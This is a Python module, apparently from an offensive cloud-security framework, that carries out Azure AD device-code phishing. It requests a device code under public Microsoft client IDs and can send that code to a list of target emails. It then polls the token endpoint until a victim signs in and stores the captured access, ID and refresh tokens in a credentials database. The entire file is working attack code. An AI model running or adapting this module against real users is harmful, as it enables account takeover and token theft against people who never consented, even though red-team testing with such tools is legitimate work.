import base64
import binascii
import json
import sys
import requests
import random
import string
from flask_mongoengine import DoesNotExist
import datetime

from core.database.models import AZURECredentials

author = {
    "name": "gl4ssesbo1",
    "twitter": "https://twitter.com/gl4ssesbo1",
    "github": "https://github.com/gl4ssesbo1",
    "blog": "https://www.pepperclipp.com/"
}

needs_creds = False

variables = {
    "SERVICE": {
        "value": "none",
        "required": "true",
        "description": "The service that will be used to run the module. It cannot be changed."
    },
    "RESOURCE": {
        "value": "https://graph.microsoft.com/",
        "required": "true",
        "description": "Resource URL"
    },
    "CLIENT-ID": {
        "value": "04b07795-8ddb-461a-bbee-02f9e1bf7b46",
        #"value": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
        #"value": "1950a258-227b-4e31-a9cf-717495945fc2",
        #"value": "1b730954-1685-4b74-9bfd-dac224a7b894",
        #"value": "de8bc8b5-d9f9-48b1-a8ad-b748da725064",
        "required": "true",
        "description": "The Application Client-ID."
    },
    "SEND-EMAIL": {
        "value": "false",
        "required": "true",
        "description": "Make this true if you want to automatically send email to the below emails, or false to just get the code."
    },
    "TARGET-EMAIL-WORDLIST": {
        "value": "",
        "required": "false",
        "description": "The keywords to check for on emails"
    },
    "REFRESH": {
        "value": "false",
        "required": "true",
        "description": "The keywords to check for on emails"
    },
    "DEVICE-CODE": {
        "value": "",
        "required": "false",
        "description": "Only add this if you are using REFRESH"
    }
}

global device_code_request_json

description = ""
aws_command = "No awscli command"

def exploit(workspace):
    global device_code_request_json
    resource = variables['RESOURCE']['value']
    client_id = variables['CLIENT-ID']['value']
    send_mail = variables['SEND-EMAIL']['value']
    target_email_wordlist = variables['TARGET-EMAIL-WORDLIST']['value']
    refresh = variables['REFRESH']['value']

    scope = 'https://graph.microsoft.com/.default'

    if refresh.lower().strip().replace("\n","") == 'false':
        try:
            device_code_request = requests.post(
                "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0",
                data={
                    "client_id": client_id,
                    "resource": resource,
                    "scope": scope
                }
            )

            if device_code_request.status_code == 200:
                if send_mail.lower().strip().replace("\n", "") == 'true':
                    email_file = open(target_email_wordlist, 'r')

                    for email in email_file.readlines():
                        send_email(email.strip().replace("\n", ""), device_code_request.json()['user_code'])

                else:
                    device_code_request_json = device_code_request.json()

                    return {
                        "client_id":{
                            "message": device_code_request.json()['message'],
                            "client_id": client_id,
                            'instructions': "Run this module periodically with REFRESH set to True to get the tokens."
                        }
                    }, 200
            else:
                return {"error": str(sys.exc_info())}, 500

        except:
            return {"error": str(sys.exc_info())}, 500

    else:
        device_code = device_code_request_json['device_code']

        token_request = requests.post(
            "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0",
            data={
                "client_id": client_id,
                "resource": resource,
                "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
                "code": device_code
            }
        )

        if token_request.status_code == 400:
            return {"device_code": {
                        "message": "Still no authentication done by the target",
                        "device_code": device_code
                }}

        elif token_request.status_code == 200:
            me = {}
            returned_request = token_request.json()
            access_token = returned_request['access_token']
            cred_id = ''.join(random.choices(string.ascii_letters + string.digits, k=10))

            device_code_request_json = {}

            try:
                #me = json.loads(requests.get("https://graph.microsoft.com/v1.0/me",
                #                   headers={
                #                        'Content-Type': 'application/json',
                #                        'Authorization': 'Bearer {}'.format(access_token)
                #                   }).text
                #                )

                access_token_json = json.loads(base64.b64decode(access_token.split(".")[1]))


                database_dict = {
                    "azure_user_id": access_token_json['oid'],
                    "azure_creds_name": cred_id,
                    "azure_user_principal_name": access_token_json['upn'],
                    "azure_access_token": access_token,
                    "azure_id_token": returned_request['id_token'],
                    "azure_refresh_token": returned_request['refresh_token'],
                    "azure_expiration_date": datetime.datetime.fromtimestamp(int(returned_request['expires_on'])).isoformat(),
                    "azure_user_name": (access_token_json['upn']).split("@")[0],
                    "azure_resource": resource,
                    "azure_creds_scope": (returned_request['scope']).split(" ")
                }

                me = {
                    "azure_user_id": access_token_json['oid'],
                    "azure_user_principal_name": access_token_json['upn'],
                    "azure_user_name": (access_token_json['upn']).split("@")[0],
                    "azure_resource": resource,
                    "azure_creds_name": cred_id
                }

                try:
                    azure_user = AZURECredentials.objects.get(azure_creds_name=database_dict['azure_creds_name'])
                    azure_user.modify(**database_dict)
                    azure_user.save()

                except DoesNotExist:
                    AZURECredentials(**database_dict).save()

                except:
                    e = sys.exc_info()[1]
                    if "AWSUsers matching query does not exist" in e:
                        return {"error": "AWSUsers matching query does not exist".format(str(e))}, 500
                    else:
                        return {"error": "Error from module: {}".format(str(e))}, 500

            except binascii.Error:
                access_token = (returned_request['access_token']).split(".")[1]
                access_token += "=" * ((4 - len(access_token) % 4) % 4)
                access_token_json = json.loads(base64.b64decode(access_token))

                database_dict = {
                    "azure_user_id": access_token_json['oid'],
                    "azure_creds_name": cred_id,
                    "azure_user_principal_name": access_token_json['upn'],
                    "azure_access_token": returned_request['access_token'],
                    "azure_id_token": returned_request['id_token'],
                    "azure_refresh_token": returned_request['refresh_token'],
                    "azure_expiration_date": datetime.datetime.fromtimestamp(int(returned_request['expires_on'])).isoformat(),
                    "azure_user_name": (access_token_json['upn']).split("@")[0],
                    "azure_resource": resource,
                    "azure_creds_scope": (returned_request['scope']).split(" ")
                }

                me = {
                    "azure_user_id": access_token_json['oid'],
                    "azure_user_principal_name": access_token_json['upn'],
                    "azure_user_name": (access_token_json['upn']).split("@")[0],
                    "azure_resource": resource,
                    "azure_creds_name": cred_id
                }


                try:
                    azure_user = AZURECredentials.objects.get(
                        azure_creds_name=database_dict['azure_creds_name'])
                    azure_user.modify(**database_dict)
                    azure_user.save()

                except DoesNotExist:
                    AZURECredentials(**database_dict).save()

                except:
                    e = sys.exc_info()
                    if "AWSUsers matching query does not exist" in e:
                        return {"error": "AWSUsers matching query does not exist".format(str(e))}, 500
                    else:
                        return {"error": "Error from module: {}".format(str(e))}, 500

            except:
                return {
                    "error": "No Privs to check user's info"
                }

            return {
                    "azure_creds_name": me
                }

def send_email(email, device_code):
    print(email, device_code)

